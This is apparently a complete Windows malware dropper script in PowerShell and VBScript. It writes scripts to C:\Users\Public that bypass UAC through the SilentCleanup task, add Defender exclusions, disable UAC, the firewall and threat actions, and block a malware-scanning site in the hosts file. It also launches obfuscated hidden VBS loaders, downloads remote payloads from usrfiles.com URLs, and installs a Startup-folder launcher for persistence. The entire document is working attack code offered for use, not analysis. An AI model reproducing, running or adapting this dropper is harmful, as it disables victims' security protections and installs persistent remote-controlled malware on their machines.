Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,bd,35,d9,8e,f5,fe,1a,82,de,56,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '41,a1,7c,3f,c6,0c,78,12,aa,f4,50,1a,56,a0,25,fd,6e,73,eb,6f,a4,cb,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,d9,ae,46,e8,ee,0e,25,16,99,b8,53,4e,6e,ca,41,cb,73,1d,18,f1,70,54,1c,50,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '76,9a,c1,1a,f1,88,4c,8b,24,45,47,cf,c5,c9,9c,f9,23,f0,f6,90,60,b2,3b,0d,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,79,26,08,4f,83,50,b9,5e,a2,48,68,e7,84,98,58,72,2b,68,78,3f,d8,35,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'cb,93,0d,51,9d,87,6c,f1,3f,a7,8e,96,c5,de,4f,43,d2,eb,c6,c8,98,b6,0c,7e,cf,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '39,42,f3,53,f9,17,34,66,b7,85,92,bb,75,fe,c4,a4,5b' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{852FB1F8-5CC6-4567-9C0E-7C330F8807C2}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:23,00,41,00,43,00,42,00,6c,00,6f,00,62,00,00,00,00,00,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,01,00,00,00,00,00,00,00,9c,b0,76,75' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{852FB1F8-5CC6-4567-9C0E-7C330F8807C2}.check.101]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:23,00,41,00,43,00,42,00,6c,00,6f,00,62,00,00,00,00,00,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,01,00,00,00,73,00,5d,00,00,00,00,00' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{96F4A050-7E31-453C-88BE-9634F4E02139}.check.8010]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,75,48,5d,ca,c2,43,ba,a0,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'ff,1f,39,43,4a,28,2c,da,38,30,83,c7,af,ab,38,0b,f5,fc,10,c4,fa,ff,82,d4,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,b8,c3,8b,78,31,e4,a5,03,d1,76,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '7c,76,ed,84,38,98,ae,93,8d,6d,23,1b,43,0a,8e,e6,43,9f,57,82,75,95,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,98,21,d5,d8,13,de,e6,ee,4c,5b,a9,69,82,1f,c3,ec,f4,6c,95,82,dd,e4,24,76,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'a2,41,15,6f,20,53,c8,10,47,b5,ec,36,b8,cc,4c,75,7a,8b,6b,4f,6e,f1,20,69,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,91,57,7e,66,6b,18,ee,a0,90,0d,b7,bb,9e,be,bf,ab,76,b5,ea,e7,cc,8a,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '5c,26,e7,b2,72,ad,9c,5a,9c,4d,a5,e4,e5,13,a4,70,18,e5,42,20,df,f0,26,2f,63,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '6b,a3,da,9b,df,35,16,6f,b6,84,ea,20,2d,c4,09,3a,1e' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{A5268B8E-7DB5-465b-BAB7-BDCDA39A394A}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,f9,e1,18,1a,c8,a3,c7,3b,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '5e,a5,ea,69,8b,5d,43,d9,4b,22,3e,cf,c5,44,88,cd,6c,6b,0a,b7,90,bb,21,ba,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,d8,9e,cf,cf,fe,13,9e,10,d1,0a,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'f1,fb,b5,79,73,d7,1e,aa,cc,48,e7,64,ea,07,d0,da,d0,79,3b,20,9a,db,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,af,19,a5,db,61,52,e4,0f,f2,26,ed,f9,05,86,40,f1,95,3f,fc,4e,5d,74,40,24,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'd2,87,24,fa,1e,01,39,77,22,88,ea,cc,3b,9d,80,b8,dd,03,9b,05,24,6a,b6,55,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0b,4f,dd,41,a8,75,be,8d,b3,cf,07,82,a6,81,9b,d2,3d,9e,5c,3c,9d,47,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '94,37,f0,76,4c,de,e5,b2,f2,a1,82,00,6f,88,87,12,4b,33,ed,7c,d5,8d,ef,d9,38,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '91,8f,ad,e2,66,24,91,5c,c1,48,80,cb,54,9a,19,41,d2' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{AA4C798D-D91B-4B07-A013-787F5803D6FC}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,5a,67,5e,c4,25,5d,76,76,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '75,7b,71,03,97,2c,18,fc,7a,a6,65,bb,9a,55,27,eb,e7,fa,57,98,e5,7c,8d,d1,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,52,99,f5,92,61,97,fc,fd,93,23,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '58,4e,e6,39,77,ba,88,03,db,38,d1,5f,5f,c8,59,6e,84,50,68,95,8b,bc,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,10,d0,cd,a8,06,e3,35,5e,c8,57,c7,35,d1,ef,17,ce,33,4f,07,f2,32,64,16,11,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'b5,d0,2d,af,ca,d1,52,84,ed,7a,e6,7c,77,5c,d1,19,e8,35,c2,69,ed,9c,10,19,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,28,8c,5f,da,6d,ba,8a,9e,ab,59,35,96,25,62,82,14,42,f0,a2,18,c4,1a,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'a3,71,4d,10,d1,c6,bb,f9,8c,f6,85,ba,b0,07,28,14,a6,b5,f5,ea,a2,5f,3e,cd,fd,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '42,f9,d5,bb,43,fc,06,83,94,d3,ba,54,ca,7b,ef,c0,bb' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{B447B4DB-7780-11E0-ADA3-18A90531A85A}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,c7,25,bc,7f,75,9a,1c,18,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '0b,8e,54,af,2d,d1,0f,9d,38,b0,91,24,cf,5a,27,32,cc,cf,f6,f0,48,32,29,7a,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,75,36,e0,13,b8,de,89,46,6f,d9,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'ce,3f,5c,99,7e,57,5d,be,63,81,5e,42,43,8c,e0,30,04,8f,76,f3,ad,88,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,9d,76,ef,cb,ec,c6,84,7c,cb,6d,1a,fa,cb,37,8c,68,a4,4e,7f,ec,d6,8a,de,d8,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '07,58,ec,08,b1,ba,c1,6d,81,2c,9a,14,ab,2b,6e,44,3f,09,96,3c,60,e1,19,d9,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,54,41,fe,74,4c,ef,7a,dd,49,8d,f5,ff,2e,65,9b,64,17,1b,9e,7d,91,b5,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '7f,b3,2f,e8,24,0f,b7,52,bf,8c,b7,b3,70,9a,ca,5a,f3,dd,86,21,41,63,7d,7e,14,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '56,f1,7c,5b,14,44,c3,28,17,a0,e3,4b,22,ae,98,fe,77' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{C8E6F269-B90A-4053-A3BE-499AFCEC98C4}.check.0]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:23,00,41,00,43,00,42,00,6c,00,6f,00,62,00,00,00,00,00,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,01,00,00,00,13,98,18,47,00,4c,c5,63' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{D26DE5C1-C061-43F7-9C40-7517526CF1C1}.check.0]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{DE7B24EA-73C8-4A09-985D-5BDADCFA9017}.check.800]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:01,00,00,00,d0,8c,9d,df,01,15,d1,11,8c,7a,00,c0,4f,c2,97,eb,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,c5,b3,6a,e4,0c,03,21,45,ac,98,0c,b7,4e,27,27,e1,00,00,00,00,02,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,00,00,10,66,00,00,00,01,00,00,20,00,00,00,22,0b,bc,83,de,80,48,e3,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'bb,16,49,36,3a,fa,17,dd,08,46,9f,6c,dc,6d,0a,15,e7,4d,26,27,2c,99,19,a3,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,0e,80,00,00,00,02,00,00,20,00,00,00,32,ac,47,3e,d0,2e,5d,6e,dc,09,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '64,6e,39,4f,f2,c6,36,d5,29,df,c8,c6,76,72,90,91,b0,92,ce,58,d3,d2,30,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,d8,8b,fd,78,94,84,08,af,f8,90,24,f5,39,89,17,bf,6e,6e,0a,7c,5d,c9,ea,4b,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '6a,ee,63,45,f6,fa,38,f0,a6,0c,18,f3,68,60,b9,b0,70,0d,20,17,07,a2,0c,29,40,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,00,00,4c,c7,72,13,a1,79,b6,af,d1,43,da,88,2a,a3,39,a9,af,e4,84,6b,95,c6,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'ef,b9,cc,c5,bc,3c,21,a5,32,33,c0,30,99,d9,ec,63,68,cc,73,b8,00,c2,a3,9c,3e,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value 'a7,00,e0,a6,28,b2,5d,c3,4f,73,f5,b0,b0,6b,b4,b4,73' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{E8433B72-5842-4d43-8645-BC2C35960837}.check.100]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{E8433B72-5842-4d43-8645-BC2C35960837}.check.101]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{E8433B72-5842-4d43-8645-BC2C35960837}.check.102]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{E8433B72-5842-4d43-8645-BC2C35960837}.check.104]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Security and Maintenance\Checks\{E8433B72-5842-4d43-8645-BC2C35960837}.check.106]' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '"CheckSetting"=hex:23,00,41,00,43,00,42,00,6c,00,6f,00,62,00,00,00,00,00,00,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '01,00,00,00,90,00,00,00,94,a2,c6,62,6b,28,fb,fb,b0,dc,d0,01,01,00,00,00,7b,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,45,00,38,00,34,00,33,00,33,00,42,00,37,00,32,00,2d,00,35,00,38,00,34,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '32,00,2d,00,34,00,64,00,34,00,33,00,2d,00,38,00,36,00,34,00,35,00,2d,00,42,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,43,00,32,00,43,00,33,00,35,00,39,00,36,00,30,00,38,00,33,00,37,00,7d,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '2e,00,6e,00,6f,00,74,00,69,00,66,00,69,00,63,00,61,00,74,00,69,00,6f,00,6e,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '00,2e,00,31,00,30,00,36,00,2e,00,32,00,2d,00,31,00,35,00,36,00,33,00,37,00,\' -Force
Add-Content -Path C:\Users\Public\meta.ps1 -Value '35,00,00,00,c6,62,02,00,00' -Force

Get-Content -Path C:\Users\Public\meta.ps1

New-Item -Path C:\Users\Public\Cola.ps1 -ItemType File
Set-ItemProperty -Path C:\Users\Public\Cola.ps1 -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Cola.ps1 -Value 'if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) { ' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value 'start C:\Users\Public\common.vbs' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '} else {' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    $meta = "HKCU:\Environment"' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    $Name = "windir"' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    $Value = "powershell -ep bypass -w h $PSCommandPath;#"' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    Set-ItemProperty -Path $meta -Name $name -Value $Value' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    #Depending on the performance of the machine, some sleep time may be required before or after schtasks' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '    Remove-ItemProperty -Path $meta -Name $name' -Force
Add-Content -Path C:\Users\Public\Cola.ps1 -Value '}' -Force

Get-Content -Path C:\Users\Public\Cola.ps1

New-Item -Path C:\Users\Public\Tackel.ps1 -ItemType File
Set-ItemProperty -Path C:\Users\Public\Tackel.ps1 -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionPath  C:\' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionPath  D:\' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionPath  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionPath  C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess explorer.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess powershell.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess aspnet_compiler.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess cmd.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess Wscript.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess Mshta.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Add-MpPreference -ExclusionProcess jsc.exe' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -PUAProtection disable' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -HighThreatDefaultAction 6' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -ModerateThreatDefaultAction 6' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -LowThreatDefaultAction 6' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -SevereThreatDefaultAction 6' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Set-MpPreference -ScanScheduleDay 8' -Force
Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'netsh advfirewall set allprofiles state off' -Force
Add-Content -Path $env:windir\System32\drivers\etc\hosts -Value "`n66.254.114.41 virusscan.jotti.org" -Force

Add-Content -Path C:\Users\Public\Tackel.ps1 -Value 'Dism /online /enable-feature /featurename:NetFX3' -Force
Get-Content -Path C:\Users\Public\Tackel.ps1

New-Item -Path C:\Users\Public\common.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\common.vbs -Name IsReadOnly -Value $True

Add-Content -Path C:\Users\Public\common.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H2 = "Tackel.ps1"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'hnv.Run RENAME,0' -Force

Add-Content -Path C:\Users\Public\common.vbs -Value 'WScript.Sleep 4000' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H2 = "meta.ps1"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\common.vbs -Value 'hnv.Run RENAME,0' -Force

New-Item -Path C:\Users\Public\Chrome.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Chrome.vbs -Name IsReadOnly -Value $True

Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H2 = "Cola.ps1"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Chrome.vbs -Value 'hnv.Run RENAME,0' -Force
Get-Content -Path C:\Users\Public\Chrome.vbs
start-sleep -s 2

Start "C:\Users\Public\Chrome.vbs"


start-sleep -s 15
New-Item -Path C:\Users\Public\Micropoft.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\Micropoft.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H4 = " -nologo "' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s13' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s14' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s15' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H3 = "powershell.exe"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H2 = "msi.ps1"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H7 = " Unrestricted"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s16' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s17' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s18' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s19' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s20' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H8 = " -File C:\Users\Public\"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'H5 = "-ExecutionPolicy"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s21' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s22' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s23' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'wind = "WScript.Shell"' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'set hnv = CreateObject(wind)' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s24' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s25' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'RENAME = H3+H4+H5+H7+H8+H2' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s26' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s27' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'hnv.Run RENAME,0' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s28' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s29' -Force
Add-Content -Path C:\Users\Public\Micropoft.vbs -Value 'Dim s30' -Force

Get-Content -Path C:\Users\Public\Micropoft.vbs


start-sleep -s 2

$defender = 'C1@#%%$!@#blic\'.Replace("1@#%%$!@#",":\Users\Pu")
$SystemSettingsBroker = "`N`e`T`.`W`e`B`C`l`i`e`N`T"
if((New-Object $SystemSettingsBroker)."`D`o`w`N`l`o`A`d`F`i`l`e"('https://92c49223-b37f-4157-904d-daf4679f14d5.usrfiles.com/ugd/92c492_b65fd9e29d234e599ee68ce0e09f013e.txt', $defender + 'msi.ps1')){
}

start-sleep -s 10

Move-Item -Path "C:\Users\Public\Micropoft.vbs" -Destination "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs" -Force -Verbose

start-sleep -s 2

Invoke-Item "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Micropoft.vbs"


New-Item -Path C:\Users\Public\megaa.vbs -ItemType File
Set-ItemProperty -Path C:\Users\Public\megaa.vbs -Name IsReadOnly -Value $True
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'strFileURL = "https://deb43e46-145f-4ebd-abfb-69a78b67bacf.usrfiles.com/ugd/deb43e_bf00cf58b008425fbea3760e9d52e173.txt"' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'strHDLocation = "C:\Users\Public\KOMITI.BIN"' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objXMLHTTP.open "GET", strFileURL, false' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objXMLHTTP.send()' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'If objXMLHTTP.Status = 200 Then' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set objADOStream = CreateObject("ADODB.Stream")' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.Open' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.Type = 1' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.Write objXMLHTTP.ResponseBody' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.Position = 0' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.SaveToFile strHDLocation' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'objADOStream.Close' -Force
Add-Content -Path C:\Users\Public\megaa.vbs -Value 'Set objADOStream = Nothing' -Force
